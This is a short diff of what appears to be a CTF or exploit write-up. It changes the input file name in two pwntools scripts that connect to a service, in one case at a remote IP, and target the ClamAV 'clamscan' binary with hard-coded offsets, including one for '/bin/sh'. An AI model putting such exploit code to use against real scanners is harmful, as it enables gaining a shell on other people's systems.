@@ -234,7 +234,7 @@ from pwn import *
 
 p = remote("localhost", 10000)
 
-data = open("exp.exe").read()
+data = open("petite.exe").read()
 
 original_offset = '\x74\x60\x00\x00'
 binsh_offset = p32(0x180d0)
@@ -288,7 +288,7 @@ def encode(data):
 p = remote("141.164.48.191", 10000)
 e = ELF('./clamscan')
 
-data = open("exp.exe").read()
+data = open("petite.exe").read()
 
 original_offset = '\x74\x60\x00\x00'
 original_ssrc = "VirtualPro"
